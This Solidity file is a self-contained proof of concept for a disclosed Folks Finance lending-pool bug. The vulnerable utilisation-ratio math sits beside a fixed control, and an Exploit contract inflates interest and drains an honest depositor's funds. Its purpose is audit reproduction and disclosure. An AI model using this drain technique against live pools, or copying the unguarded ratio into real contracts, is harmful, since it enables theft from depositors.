// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Folks Finance finding 61019:
// "Infinite Interest rate bug".
//
// Root cause (MathUtils.calcUtilisationRatio): the utilisation ratio is
//   U = totalDebt * 1e18 / totalDeposits
// with NO check that totalDebt <= totalDeposits. On a freshly-listed token pool
// an attacker deposits a dust amount (making totalDeposits tiny), then drives
// totalDebt far above totalDeposits. Utilisation blows past 100% (1e18), which
// makes the variable-borrow interest rate explode to ~4e31 (trillions of %/sec).
// One block of index accrual turns the attacker's dust deposit receipt into an
// astronomically large underlying claim — the pool is instantly insolvent and
// the attacker withdraws every real token, draining honest co-depositors.
//
// The interest-rate math (calcUtilisationRatio / calcVariableBorrowInterestRate
// / calcStableBorrowInterestRate / calcOverallBorrowInterestRate /
// calcDepositInterestRate / calcDepositInterestIndex / calcBorrowInterestIndex /
// calcRetention / toFAmount / toUnderlingAmount) is inlined VERBATIM from the
// audited source (Folks-Finance/folks-finance-xchain-contracts,
// contracts/hub/libraries/MathUtils.sol, pre-fix state = commit 91ab9a3~1).
// The fix (PR #225, commit 91ab9a3 "add extra checks to math lib") added the
// single guard `if (totalDebt > totalDeposits) revert RatioExceedsOne();` to
// calcUtilisationRatio — see calcUtilisationRatioFixed / HubPoolFixed below,
// used as the negative control.
//
// The HubPool state machine mirrors HubPoolState + HubPoolLogic verbatim
// (updateInterestRates / updateInterestIndexes / updateWithBorrow). Only the
// opaque underlying ERC20 is a minimal faithful double (MiniToken). The single
// block of elapsed time is passed explicitly as `timeDelta` (the single-block,
// cheatcode-free Playground model cannot warp) — identical math to the real
// `block.timestamp - lastUpdateTimestamp`.
// ─────────────────────────────────────────────────────────────────────────────

// ─────────────────────────────────────────────────────────────────────────────
// OpenZeppelin v5 Math.mulDiv — inlined VERBATIM (512-bit intermediate).
// ─────────────────────────────────────────────────────────────────────────────
library Math {
    error MathOverflowedMulDiv();

    enum Rounding {
        Floor, // Toward negative infinity
        Ceil, // Toward positive infinity
        Trunc, // Toward zero
        Expand // Away from zero
    }

    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {
            uint256 prod0 = x * y; // Least significant 256 bits of the product
            uint256 prod1; // Most significant 256 bits of the product
            assembly {
                let mm := mulmod(x, y, not(0))
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            // Handle non-overflow cases, 256 by 256 division.
            if (prod1 == 0) {
                return prod0 / denominator;
            }

            // Make sure the result is less than 2^256. Also prevents denominator == 0.
            if (denominator <= prod1) {
                revert MathOverflowedMulDiv();
            }

            uint256 remainder;
            assembly {
                remainder := mulmod(x, y, denominator)
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            uint256 twos = denominator & (0 - denominator);
            assembly {
                denominator := div(denominator, twos)
                prod0 := div(prod0, twos)
                twos := add(div(sub(0, twos), twos), 1)
            }

            prod0 |= prod1 * twos;

            uint256 inverse = (3 * denominator) ^ 2;
            inverse *= 2 - denominator * inverse; // inverse mod 2^8
            inverse *= 2 - denominator * inverse; // inverse mod 2^16
            inverse *= 2 - denominator * inverse; // inverse mod 2^32
            inverse *= 2 - denominator * inverse; // inverse mod 2^64
            inverse *= 2 - denominator * inverse; // inverse mod 2^128
            inverse *= 2 - denominator * inverse; // inverse mod 2^256

            result = prod0 * inverse;
            return result;
        }
    }

    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }

    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {
        return uint8(rounding) % 2 == 1;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// MathUtils — interest-rate math inlined VERBATIM from the audited source.
// calcUtilisationRatio is the VULNERABLE (pre-fix) version. calcUtilisationRatioFixed
// carries the guard the fix (PR #225) added, used only by the HubPoolFixed control.
// ─────────────────────────────────────────────────────────────────────────────
library MathUtils {
    using Math for uint256;

    error RatioExceedsOne();

    uint256 private constant SECONDS_IN_YEAR = 365 days;
    uint256 internal constant ONE_4_DP = 1e4;
    uint256 internal constant ONE_6_DP = 1e6;
    uint256 internal constant ONE_10_DP = 1e10;
    uint256 internal constant ONE_12_DP = 1e12;
    uint256 internal constant ONE_14_DP = 1e14;
    uint256 internal constant ONE_18_DP = 1e18;

    /// @dev VULNERABLE: pre-fix calcUtilisationRatio (audited commit 91ab9a3~1).
    /// Missing the `if (totalDebt > totalDeposits) revert RatioExceedsOne();`
    /// guard that PR #225 added — so when totalDebt exceeds totalDeposits the
    /// utilisation ratio runs far above 1e18 (100%), exploding every downstream
    /// interest rate.
    function calcUtilisationRatio(uint256 totalDebt, uint256 totalDeposits) internal pure returns (uint256) {
        return totalDeposits > 0 ? totalDebt.mulDiv(ONE_18_DP, totalDeposits) : 0; // @> no `if (totalDebt > totalDeposits) revert RatioExceedsOne();` guard: utilisation exceeds 1e18 when debt > deposits, exploding the borrow/deposit rates
    }

    /// @dev FIXED variant: the guard added by PR #225 (commit 91ab9a3). Control only.
    function calcUtilisationRatioFixed(uint256 totalDebt, uint256 totalDeposits) internal pure returns (uint256) {
        if (totalDebt > totalDeposits) revert RatioExceedsOne();
        return totalDeposits > 0 ? totalDebt.mulDiv(ONE_18_DP, totalDeposits) : 0;
    }

    /// @dev Pre-fix calcStableDebtToTotalDebtRatio (no guard). Verbatim exploit dep.
    function calcStableDebtToTotalDebtRatio(uint256 totalStblDebt, uint256 totalDebt) internal pure returns (uint256) {
        return totalDebt > 0 ? totalStblDebt.mulDiv(ONE_18_DP, totalDebt) : 0;
    }

    function calcVariableBorrowInterestRate(
        uint32 vr0,
        uint32 vr1,
        uint32 vr2,
        uint256 utilisationRatioAtT,
        uint16 optimalUtilisationRatio
    ) internal pure returns (uint256) {
        return
            utilisationRatioAtT < from4DPto18DP(optimalUtilisationRatio)
                ? from6DPto18DP(vr0) +
                    utilisationRatioAtT.mulDiv(vr1, ONE_6_DP).mulDiv(ONE_4_DP, optimalUtilisationRatio)
                : from6DPto18DP(vr0 + vr1) +
                    (utilisationRatioAtT - from4DPto18DP(optimalUtilisationRatio)).mulDiv(vr2, ONE_6_DP).mulDiv(
                        ONE_4_DP,
                        ONE_4_DP - optimalUtilisationRatio
                    );
    }

    function calcStableBorrowInterestRate(
        uint32 vr1,
        uint32 sr0,
        uint32 sr1,
        uint32 sr2,
        uint32 sr3,
        uint256 utilisationRatioAtT,
        uint16 optimalUtilisationRatio,
        uint256 stableDebtToTotalDebtRatioAtT,
        uint16 optimalStableToTotalDebtRatio
    ) internal pure returns (uint256) {
        return
            (
                utilisationRatioAtT <= from4DPto18DP(optimalUtilisationRatio)
                    ? from6DPto18DP(vr1 + sr0) +
                        utilisationRatioAtT.mulDiv(sr1, ONE_6_DP).mulDiv(ONE_4_DP, optimalUtilisationRatio)
                    : from6DPto18DP(vr1 + sr0 + sr1) +
                        (utilisationRatioAtT - from4DPto18DP(optimalUtilisationRatio)).mulDiv(sr2, ONE_6_DP).mulDiv(
                            ONE_4_DP,
                            ONE_4_DP - optimalUtilisationRatio
                        )
            ) +
            (
                stableDebtToTotalDebtRatioAtT <= from4DPto18DP(optimalStableToTotalDebtRatio)
                    ? 0
                    : (stableDebtToTotalDebtRatioAtT - from4DPto18DP(optimalStableToTotalDebtRatio))
                        .mulDiv(sr3, ONE_6_DP)
                        .mulDiv(ONE_4_DP, ONE_4_DP - optimalStableToTotalDebtRatio)
            );
    }

    function calcOverallBorrowInterestRate(
        uint256 totalVarDebt,
        uint256 totalStblDebt,
        uint256 variableBorrowInterestRateAtT,
        uint256 avgStableBorrowInterestRateAtT
    ) internal pure returns (uint256) {
        uint256 totalDebt = totalVarDebt + totalStblDebt;
        return
            totalDebt > 0
                ? (totalVarDebt.mulDiv(variableBorrowInterestRateAtT, ONE_18_DP) +
                    totalStblDebt.mulDiv(avgStableBorrowInterestRateAtT, ONE_18_DP)).mulDiv(ONE_18_DP, totalDebt)
                : 0;
    }

    function calcDepositInterestRate(
        uint256 utilisationRatioAtT,
        uint256 overallBorrowInterestRateAtT,
        uint32 retentionRate
    ) internal pure returns (uint256) {
        return
            utilisationRatioAtT.mulDiv(overallBorrowInterestRateAtT, ONE_18_DP).mulDiv(
                ONE_6_DP - retentionRate,
                ONE_6_DP
            );
    }

    function exponentialBySquaring(uint256 x, uint256 n, uint256 scale) internal pure returns (uint256 z) {
        z = n % 2 != 0 ? x : scale;
        for (n /= 2; n != 0; n /= 2) {
            x = x.mulDiv(x, scale);
            if (n % 2 != 0) {
                z = z.mulDiv(x, scale);
            }
        }
    }

    function calcBorrowInterestIndex(
        uint256 borrowInterestRateAtT_1,
        uint256 borrowInterestIndexAtT_1,
        uint256 timeDelta
    ) internal pure returns (uint256) {
        return
            borrowInterestIndexAtT_1.mulDiv(
                exponentialBySquaring(ONE_18_DP + (borrowInterestRateAtT_1 / SECONDS_IN_YEAR), timeDelta, ONE_18_DP),
                ONE_18_DP
            );
    }

    function calcDepositInterestIndex(
        uint256 depositInterestRateAtT_1,
        uint256 depositInterestIndexAtT_1,
        uint256 timeDelta
    ) internal pure returns (uint256) {
        return
            depositInterestIndexAtT_1.mulDiv(
                ONE_18_DP + depositInterestRateAtT_1.mulDiv(timeDelta, SECONDS_IN_YEAR),
                ONE_18_DP
            );
    }

    function toFAmount(
        uint256 underlyingAmount,
        uint256 depositInterestIndexAtT,
        Math.Rounding rounding
    ) internal pure returns (uint256) {
        return underlyingAmount.mulDiv(ONE_18_DP, depositInterestIndexAtT, rounding);
    }

    function toUnderlingAmount(uint256 fAmount, uint256 depositInterestIndexAtT) internal pure returns (uint256) {
        return fAmount.mulDiv(depositInterestIndexAtT, ONE_18_DP);
    }

    function calcRetention(
        uint256 actualRetained,
        uint256 totalDebt,
        uint256 overallBorrowInterestRate,
        uint32 retentionRate,
        uint256 timeDelta
    ) internal pure returns (uint256) {
        return
            actualRetained +
            totalDebt.mulDiv(overallBorrowInterestRate, ONE_18_DP).mulDiv(retentionRate, ONE_6_DP).mulDiv(
                timeDelta,
                SECONDS_IN_YEAR
            );
    }

    function from0DPto18DP(uint256 value) internal pure returns (uint256) {
        return value * ONE_18_DP;
    }
    function from4DPto18DP(uint256 value) internal pure returns (uint256) {
        return value * ONE_14_DP;
    }
    function from6DPto18DP(uint256 value) internal pure returns (uint256) {
        return value * ONE_12_DP;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful double for the opaque underlying ERC20.
// ─────────────────────────────────────────────────────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// HubPool base — mirrors HubPoolState (struct layout) + HubPoolLogic
// (updateInterestRates / updateInterestIndexes / updateWithBorrow) VERBATIM.
// The only variation between the buggy and fixed subclasses is which utilisation
// function is called (see _utilisationRatio override).
// ─────────────────────────────────────────────────────────────────────────────
abstract contract HubPoolBase {
    using MathUtils for uint256;

    // Struct layout copied from HubPoolState.
    struct FeeData {
        uint32 flashLoanFee;
        uint32 retentionRate;
        uint256 totalRetainedAmount;
    }
    struct DepositData {
        uint16 optimalUtilisationRatio;
        uint256 totalAmount;
        uint256 interestRate;
        uint256 interestIndex;
    }
    struct VariableBorrowData {
        uint32 vr0;
        uint32 vr1;
        uint32 vr2;
        uint256 totalAmount;
        uint256 interestRate;
        uint256 interestIndex;
    }
    struct StableBorrowData {
        uint32 sr0;
        uint32 sr1;
        uint32 sr2;
        uint32 sr3;
        uint16 optimalStableToTotalDebtRatio;
        uint256 totalAmount;
        uint256 interestRate;
        uint256 averageInterestRate;
    }

    FeeData public feeData;
    DepositData public depositData;
    VariableBorrowData public variableBorrowData;
    StableBorrowData public stableBorrowData;

    MiniToken public underlying;
    mapping(address => uint256) public fToken; // deposit receipt (fAsset) balances

    constructor(address underlying_) {
        underlying = MiniToken(underlying_);

        // Initial pool parameters — verbatim from test/hub/libraries/assets/poolData.ts.
        feeData.flashLoanFee = uint32(0.001e6);
        feeData.retentionRate = uint32(0.1e6);
        feeData.totalRetainedAmount = 0;

        depositData.optimalUtilisationRatio = uint16(0.75e4);
        depositData.totalAmount = 0;
        depositData.interestRate = 0;
        depositData.interestIndex = MathUtils.ONE_18_DP;

        variableBorrowData.vr0 = uint32(0.0175e6);
        variableBorrowData.vr1 = uint32(0.05e6);
        variableBorrowData.vr2 = uint32(1.0e6);
        variableBorrowData.totalAmount = 0;
        variableBorrowData.interestRate = uint256(0.0175e18);
        variableBorrowData.interestIndex = MathUtils.ONE_18_DP;

        stableBorrowData.sr0 = uint32(0.02e6);
        stableBorrowData.sr1 = uint32(0.02e6);
        stableBorrowData.sr2 = uint32(1.0e6);
        stableBorrowData.sr3 = uint32(0.25e6);
        stableBorrowData.optimalStableToTotalDebtRatio = uint16(0.2e4);
        stableBorrowData.totalAmount = 0;
        stableBorrowData.interestRate = uint256(0.07e18);
        stableBorrowData.averageInterestRate = 0;

        // initialise interest rates (utilisation 0)
        updateInterestRates();
    }

    /// @dev The one line that differs between the vulnerable pool and the fixed control.
    function _utilisationRatio(uint256 totalDebt, uint256 totalDeposits) internal pure virtual returns (uint256);

    /// @notice Mirrors HubPoolLogic.updateWithBorrow (variable path).
    function updateWithBorrow(uint256 additionalBorrowAmount, bool isStable) external {
        if (isStable) {
            stableBorrowData.totalAmount += additionalBorrowAmount;
        } else {
            variableBorrowData.totalAmount += additionalBorrowAmount;
        }
        updateInterestRates();
    }

    /// @notice Deposit path: mint fAsset receipt at the current deposit index and
    ///         recognise the underlying in totalAmount. Mirrors updateWithDeposit.
    function creditDeposit(address user, uint256 amount) external {
        uint256 fAmount = MathUtils.toFAmount(amount, depositData.interestIndex, Math.Rounding.Floor);
        fToken[user] += fAmount;
        depositData.totalAmount += amount;
        updateInterestRates();
    }

    /// @notice Redeem fAsset for underlying at the current (accrued) deposit index,
    ///         capped by what the pool physically holds. Mirrors withdraw.
    function withdraw(address to, uint256 fAmount) external returns (uint256 paid) {
        fToken[msg.sender] -= fAmount;
        uint256 owed = MathUtils.toUnderlingAmount(fAmount, depositData.interestIndex);
        uint256 bal = underlying.balanceOf(address(this));
        paid = owed > bal ? bal : owed; // insolvent pool can only pay what it holds
        depositData.totalAmount -= (paid > depositData.totalAmount ? depositData.totalAmount : paid);
        underlying.transfer(to, paid);
    }

    /// @notice Mirrors HubPoolLogic.updateInterestRates VERBATIM.
    function updateInterestRates() public {
        uint256 totalDebt = variableBorrowData.totalAmount + stableBorrowData.totalAmount;
        uint256 utilisationRatio = _utilisationRatio(totalDebt, depositData.totalAmount);
        uint32 vr1 = variableBorrowData.vr1;

        uint256 variableBorrowInterestRate = MathUtils.calcVariableBorrowInterestRate(
            variableBorrowData.vr0,
            vr1,
            variableBorrowData.vr2,
            utilisationRatio,
            depositData.optimalUtilisationRatio
        );
        uint256 stableBorrowInterestRate = MathUtils.calcStableBorrowInterestRate(
            vr1,
            stableBorrowData.sr0,
            stableBorrowData.sr1,
            stableBorrowData.sr2,
            stableBorrowData.sr3,
            utilisationRatio,
            depositData.optimalUtilisationRatio,
            MathUtils.calcStableDebtToTotalDebtRatio(stableBorrowData.totalAmount, totalDebt),
            stableBorrowData.optimalStableToTotalDebtRatio
        );
        uint256 depositInterestRate = MathUtils.calcDepositInterestRate(
            utilisationRatio,
            MathUtils.calcOverallBorrowInterestRate(
                variableBorrowData.totalAmount,
                stableBorrowData.totalAmount,
                variableBorrowInterestRate,
                stableBorrowData.averageInterestRate
            ),
            feeData.retentionRate
        );

        variableBorrowData.interestRate = variableBorrowInterestRate;
        stableBorrowData.interestRate = stableBorrowInterestRate;
        depositData.interestRate = depositInterestRate;
    }

    /// @notice Mirrors HubPoolLogic.updateInterestIndexes VERBATIM, with the elapsed
    ///         time supplied explicitly (the single-block model cannot warp; identical
    ///         math to `block.timestamp - lastUpdateTimestamp`).
    function accrueIndexes(uint256 timeDelta) external {
        uint256 totalDebt = variableBorrowData.totalAmount + stableBorrowData.totalAmount;
        uint256 variableBorrowInterestRate = variableBorrowData.interestRate;

        feeData.totalRetainedAmount = MathUtils.calcRetention(
            feeData.totalRetainedAmount,
            totalDebt,
            MathUtils.calcOverallBorrowInterestRate(
                variableBorrowData.totalAmount,
                stableBorrowData.totalAmount,
                variableBorrowInterestRate,
                stableBorrowData.averageInterestRate
            ),
            feeData.retentionRate,
            timeDelta
        );

        uint256 variableBorrowInterestIndex = MathUtils.calcBorrowInterestIndex(
            variableBorrowInterestRate,
            variableBorrowData.interestIndex,
            timeDelta
        );
        uint256 depositInterestIndex = MathUtils.calcDepositInterestIndex(
            depositData.interestRate,
            depositData.interestIndex,
            timeDelta
        );

        variableBorrowData.interestIndex = variableBorrowInterestIndex;
        depositData.interestIndex = depositInterestIndex;
    }

    // ---- getters used by the driver / exploit (renamed to avoid shadowing the
    //      verbatim locals inside updateInterestRates / accrueIndexes) ----
    function getVariableBorrowInterestRate() external view returns (uint256) {
        return variableBorrowData.interestRate;
    }
    function getDepositInterestIndex() external view returns (uint256) {
        return depositData.interestIndex;
    }
    function totalDeposits() external view returns (uint256) {
        return depositData.totalAmount;
    }
    function previewUnderlying(uint256 fAmount) external view returns (uint256) {
        return MathUtils.toUnderlingAmount(fAmount, depositData.interestIndex);
    }
}

/// @dev Vulnerable pool — utilisation with NO guard (pre-fix audited code).
contract HubPool is HubPoolBase {
    constructor(address underlying_) HubPoolBase(underlying_) {}

    function _utilisationRatio(uint256 totalDebt, uint256 totalDeposits_) internal pure override returns (uint256) {
        return MathUtils.calcUtilisationRatio(totalDebt, totalDeposits_);
    }
}

/// @dev Fixed pool — utilisation WITH the guard PR #225 added. Negative control.
contract HubPoolFixed is HubPoolBase {
    constructor(address underlying_) HubPoolBase(underlying_) {}

    function _utilisationRatio(uint256 totalDebt, uint256 totalDeposits_) internal pure override returns (uint256) {
        return MathUtils.calcUtilisationRatioFixed(totalDebt, totalDeposits_);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver.
//
// A freshly-listed token pool holds two dust deposits: an honest co-depositor's
// 50_000 wei and the attacker's 50_000 wei (totalDeposits = 1e5). The attacker
// drives totalDebt to 1e18 (donate-then-borrow in the live protocol; here the
// borrow state is set directly, exactly as the vendor's own PoC does). With no
// utilisation guard the variable borrow rate explodes to ~4e31 and, after ONE
// second of accrual, the attacker's 50_000-wei deposit receipt is redeemable for
// ~5.7e23 underlying — vastly more than the pool's entire 1e5 real asset base.
// The attacker withdraws the whole pool, stealing the honest depositor's 50_000
// and leaving them with nothing. The stolen underlying is sent to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant HONEST = 0x000000000000000000000000000000000000600d; // honest co-depositor

    uint256 internal constant HONEST_DEPOSIT = 50_000;
    uint256 internal constant ATTACKER_DEPOSIT = 50_000;
    uint256 internal constant BORROW_AMOUNT = 1e18;
    uint256 internal constant ONE_BLOCK = 1; // seconds; "trillion percent per second"

    // Exposed results for the driver.
    uint256 public buggyVarRate;
    uint256 public attackerClaim;
    uint256 public realAssetBase;
    uint256 public stolenToAttacker;
    uint256 public honestRecoverable;
    address public underlyingAddr;
    address public poolAddr;

    function run() external payable {
        address honest = HONEST;

        MiniToken token = new MiniToken("Folks Pool Token", "STOLEN-TKN"); // nonce 1
        HubPool pool = new HubPool(address(token)); // nonce 2

        underlyingAddr = address(token);
        poolAddr = address(pool);

        // Honest co-depositor puts in 50_000 real underlying.
        token.mint(address(pool), HONEST_DEPOSIT);
        pool.creditDeposit(honest, HONEST_DEPOSIT);

        // Attacker deposits 50_000 dust. totalDeposits = 1e5.
        token.mint(address(pool), ATTACKER_DEPOSIT);
        pool.creditDeposit(address(this), ATTACKER_DEPOSIT);

        // Attacker drives totalDebt to 1e18 (donate-then-borrow in production).
        pool.updateWithBorrow(BORROW_AMOUNT, false);

        // Interest rate has exploded (~4e31 = trillions of %/sec).
        buggyVarRate = pool.getVariableBorrowInterestRate();
        require(buggyVarRate > 1e31, "rate did not explode");

        // One block/second of accrual balloons the deposit index.
        pool.accrueIndexes(ONE_BLOCK);

        // Over-mint: the attacker's dust receipt now dwarfs the whole real asset base.
        attackerClaim = pool.previewUnderlying(pool.fToken(address(this)));
        realAssetBase = pool.totalDeposits(); // 1e5 recognised deposits (== real backing)
        require(attackerClaim > realAssetBase, "no over-mint");

        // Attacker drains the pool, stealing the honest depositor's funds.
        uint256 got = pool.withdraw(address(this), pool.fToken(address(this)));

        // Honest depositor is left unable to recover anything: pool is empty.
        honestRecoverable = token.balanceOf(address(pool));
        require(honestRecoverable == 0, "pool not fully drained");

        // Isolate the STOLEN portion (honest funds beyond the attacker's principal).
        stolenToAttacker = got - ATTACKER_DEPOSIT;
        require(stolenToAttacker == HONEST_DEPOSIT, "stolen != honest deposit");

        // Leave the stolen underlying at the attacker EOA (measured harm).
        token.transfer(ATTACKER, stolenToAttacker);
    }
}
